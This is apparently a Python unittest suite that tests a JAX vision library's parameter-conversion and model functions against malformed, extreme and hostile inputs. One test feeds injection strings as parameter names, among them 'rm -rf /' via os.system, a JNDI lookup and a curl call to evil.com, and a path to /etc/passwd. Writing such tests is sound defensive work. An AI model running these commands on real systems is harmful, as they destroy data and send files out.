import pytest
import unittest
import numpy as np
import jax.numpy as jnp
from unittest.mock import patch, Mock, MagicMock
import sys
import warnings
from jax import random

import flaxvision.utils as utils
import flaxvision.models as models


class TestParameterSecurity(unittest.TestCase):
    """Comprehensive security tests for parameter validation and bounds checking."""

    def setUp(self):
        """Set up test fixtures."""
        self.rng = random.PRNGKey(42)
        self.valid_params = {
            'conv1.weight': np.random.randn(64, 3, 7, 7),
            'conv1.bias': np.random.randn(64),
            'bn1.weight': np.random.randn(64),
            'bn1.bias': np.random.randn(64),
            'fc.weight': np.random.randn(1000, 512),
            'fc.bias': np.random.randn(1000)
        }

    @pytest.mark.security
    def test_parameter_dimension_validation(self):
        """Test validation of parameter dimensions to prevent buffer overflows."""
        # Test with negative dimensions
        malicious_params = {
            'malicious.weight': np.array([]).reshape(-1, 0),
            'malicious.bias': np.array([]).reshape(-5, 0)
        }
        
        with self.assertRaises((ValueError, IndexError)):
            utils.torch_to_linen(malicious_params, lambda x: x)

    @pytest.mark.security
    def test_parameter_size_limits(self):
        """Test protection against extremely large parameter arrays."""
        # Create parameters that would consume excessive memory
        try:
            huge_params = {
                'huge.weight': np.ones((999999, 999999), dtype=np.float32)
            }
            with self.assertRaises((MemoryError, ValueError)):
                utils.torch_to_linen(huge_params, lambda x: x)
        except MemoryError:
            # This is expected and acceptable - the test passes
            pass

    @pytest.mark.security
    def test_parameter_type_validation(self):
        """Test validation of parameter data types."""
        invalid_type_params = {
            'str.weight': 'malicious_string',
            'list.weight': [1, 2, 3, 'injection'],
            'dict.weight': {'malicious': 'data'},
            'none.weight': None,
            'bool.weight': True
        }
        
        for param_name, param_value in invalid_type_params.items():
            with self.subTest(param=param_name):
                params = {param_name: param_value}
                with self.assertRaises((TypeError, ValueError, AttributeError)):
                    utils.torch_to_linen(params, lambda x: x)

    @pytest.mark.security
    def test_nan_infinity_handling(self):
        """Test handling of NaN and infinity values in parameters."""
        nan_inf_params = {
            'nan.weight': np.array([[np.nan, np.inf, -np.inf]]),
            'inf.bias': np.array([np.inf, -np.inf]),
            'mixed.weight': np.array([[1.0, np.nan, 2.0], [np.inf, 3.0, -np.inf]])
        }
        
        for param_name, param_value in nan_inf_params.items():
            with self.subTest(param=param_name):
                params = {param_name: param_value}
                # Should either handle gracefully or raise appropriate exception
                try:
                    result = utils.torch_to_linen(params, lambda x: x)
                    # If no exception, verify NaN/Inf are handled appropriately
                    self.assertIsNotNone(result)
                except (ValueError, FloatingPointError):
                    # These exceptions are acceptable for NaN/Inf handling
                    pass

    @pytest.mark.security
    def test_parameter_name_injection(self):
        """Test protection against parameter name injection attacks."""
        malicious_param_names = [
            '../../../etc/passwd',
            '__import__("os").system("rm -rf /")',
            'eval("__import__(\\"os\\").system(\\"whoami\\")")',
            'exec("import os; os.system(\\"ls\\")"}',
            '${jndi:ldap://evil.com/exploit}',
            '<%=Runtime.getRuntime().exec("whoami")%>',
            '{{7*7}}',  # Template injection
            '$(curl http://evil.com/steal)',
            'file:///etc/passwd',
            'javascript:alert("xss")'
        ]
        
        for malicious_name in malicious_param_names:
            with self.subTest(name=malicious_name):
                params = {malicious_name: np.array([1.0, 2.0])}
                try:
                    result = utils.torch_to_linen(params, lambda x: x)
                    # Should handle malicious names safely
                    self.assertIsInstance(result, dict)
                except (ValueError, KeyError, TypeError):
                    # These exceptions are acceptable for malicious names
                    pass

    @pytest.mark.security
    def test_parameter_value_injection(self):
        """Test protection against parameter value injection attacks."""
        # Test with specially crafted numeric values that could cause issues
        malicious_values = [
            np.array([sys.maxsize, -sys.maxsize]),  # Extreme values
            np.array([2**63-1, -(2**63)]),  # Integer overflow values
            np.array([1e308, -1e308]),  # Very large floats
            np.array([1e-308, -1e-308]),  # Very small floats
            np.array([0.0, -0.0]),  # Signed zeros
        ]
        
        for i, malicious_value in enumerate(malicious_values):
            with self.subTest(value=i):
                params = {f'test_{i}.weight': malicious_value}
                try:
                    result = utils.torch_to_linen(params, lambda x: x)
                    # Should handle extreme values safely
                    self.assertIsNotNone(result)
                except (OverflowError, ValueError):
                    # These exceptions are acceptable for extreme values
                    pass

    @pytest.mark.security
    def test_parameter_bounds_checking(self):
        """Test parameter bounds checking for model instantiation."""
        # Test with invalid model dimensions
        invalid_model_params = [
            {'num_classes': -1},  # Negative classes
            {'num_classes': 0},   # Zero classes
            {'num_classes': 2**32},  # Extremely large classes
            {'pretrained': 'malicious_string'},  # Wrong type
            {'pretrained': 999},  # Invalid pretrained value
        ]
        
        for params in invalid_model_params:
            with self.subTest(params=params):
                with self.assertRaises((ValueError, TypeError)):
                    models.resnet50(self.rng, **params)

    @pytest.mark.security
    def test_array_index_bounds(self):
        """Test array index bounds checking to prevent buffer overflows."""
        # Test with arrays that could cause index out of bounds
        params_with_wrong_shapes = {
            'conv.weight': np.random.randn(3, 3, 3),  # Wrong dimensions for conv
            'bn.weight': np.random.randn(64, 64),     # Wrong dimensions for bn
            'fc.weight': np.random.randn(1000),       # Wrong dimensions for fc
        }
        
        for param_name, param_value in params_with_wrong_shapes.items():
            with self.subTest(param=param_name):
                params = {param_name: param_value}
                try:
                    result = utils.torch_to_linen(params, lambda x: x)
                    # Should handle wrong shapes gracefully
                    self.assertIsNotNone(result)
                except (ValueError, IndexError, TypeError):
                    # These exceptions are acceptable for wrong shapes
                    pass

    @pytest.mark.security
    def test_parameter_serialization_safety(self):
        """Test safety of parameter serialization/deserialization."""
        # Test with parameters that could cause issues during serialization
        problematic_params = {
            'recursive.weight': np.array([[1.0, 2.0]]),
            'circular.weight': np.array([[3.0, 4.0]])
        }
        
        # Create circular reference (if possible)
        try:
            problematic_params['circular.weight'].base = problematic_params['recursive.weight']
        except:
            pass  # Circular reference not possible with numpy
        
        result = utils.torch_to_linen(problematic_params, lambda x: x)
        self.assertIsInstance(result, dict)

    @pytest.mark.security
    def test_parameter_memory_safety(self):
        """Test memory safety with parameter operations."""
        # Test with overlapping memory regions
        base_array = np.random.randn(1000, 1000)
        overlapping_params = {
            'view1.weight': base_array[:500, :500],
            'view2.weight': base_array[250:750, 250:750],  # Overlapping view
        }
        
        result = utils.torch_to_linen(overlapping_params, lambda x: x)
        self.assertIsInstance(result, dict)

    @pytest.mark.security
    def test_parameter_conversion_overflow(self):
        """Test parameter conversion for integer overflow conditions."""
        # Test with values that could cause overflow during conversion
        overflow_params = {
            'int_overflow.weight': np.array([2**31-1, 2**31]),
            'float_overflow.weight': np.array([1.7976931348623157e+308]),
            'underflow.weight': np.array([2.2250738585072014e-308])
        }
        
        for param_name, param_value in overflow_params.items():
            with self.subTest(param=param_name):
                params = {param_name: param_value}
                try:
                    result = utils.torch_to_linen(params, lambda x: x)
                    self.assertIsNotNone(result)
                except (OverflowError, ValueError):
                    # These exceptions are acceptable for overflow conditions
                    pass

    @pytest.mark.security
    def test_parameter_unicode_handling(self):
        """Test handling of Unicode in parameter names."""
        unicode_param_names = [
            'τεστ.weight',  # Greek
            '测试.weight',   # Chinese
            'тест.weight',   # Cyrillic
            'test\u0000.weight',  # Null character
            'test\u202e.weight',  # Right-to-left override
            'test\ufeff.weight',  # Zero-width no-break space
        ]
        
        for param_name in unicode_param_names:
            with self.subTest(name=param_name):
                params = {param_name: np.array([1.0, 2.0])}
                try:
                    result = utils.torch_to_linen(params, lambda x: x)
                    self.assertIsInstance(result, dict)
                except (UnicodeError, ValueError, KeyError):
                    # These exceptions are acceptable for Unicode handling
                    pass

    @pytest.mark.security
    def test_parameter_nested_structure_safety(self):
        """Test safety with deeply nested parameter structures."""
        # Test with deeply nested parameter names
        nested_params = {}
        for i in range(100):  # Create deeply nested structure
            nested_params[f'layer{i}.sublayer{i}.weight'] = np.random.randn(10, 10)
        
        result = utils.torch_to_linen(nested_params, lambda x: x)
        self.assertIsInstance(result, dict)

    @pytest.mark.security
    def test_parameter_concurrent_access(self):
        """Test thread safety of parameter processing."""
        import threading
        
        shared_params = {
            'shared.weight': np.random.randn(100, 100),
            'shared.bias': np.random.randn(100)
        }
        
        results = []
        errors = []
        
        def process_params():
            try:
                result = utils.torch_to_linen(shared_params, lambda x: x)
                results.append(result)
            except Exception as e:
                errors.append(e)
        
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=process_params)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Should not have race conditions
        self.assertEqual(len(errors), 0)
        self.assertEqual(len(results), 10)

    @pytest.mark.security
    def test_parameter_transformation_safety(self):
        """Test safety of parameter transformations."""
        # Test with parameters that could cause issues during transformation
        transformation_params = {
            'transpose.weight': np.random.randn(3, 3, 3, 3),
            'reshape.weight': np.random.randn(64),
            'slice.weight': np.random.randn(100, 100)
        }
        
        def unsafe_transform(x):
            # Simulate potentially unsafe transformation
            if x.ndim == 4:
                return np.transpose(x, (2, 3, 1, 0))
            return x
        
        result = utils.torch_to_linen(transformation_params, unsafe_transform)
        self.assertIsInstance(result, dict)

    @pytest.mark.security
    def test_parameter_validation_bypass(self):
        """Test attempts to bypass parameter validation."""
        # Test with parameters designed to bypass validation
        bypass_attempts = {
            'normal.weight': np.array([[1.0, 2.0]]),
            'normal.bias': np.array([1.0]),
            '': np.array([1.0]),  # Empty name
            ' ': np.array([1.0]),  # Space name
            '\t': np.array([1.0]),  # Tab name
            '\n': np.array([1.0]),  # Newline name
        }
        
        for param_name, param_value in bypass_attempts.items():
            with self.subTest(param=param_name):
                params = {param_name: param_value}
                try:
                    result = utils.torch_to_linen(params, lambda x: x)
                    if param_name.strip():  # Non-empty after strip
                        self.assertIsInstance(result, dict)
                except (ValueError, KeyError):
                    # These exceptions are acceptable for invalid names
                    pass


if __name__ == '__main__':
    unittest.main()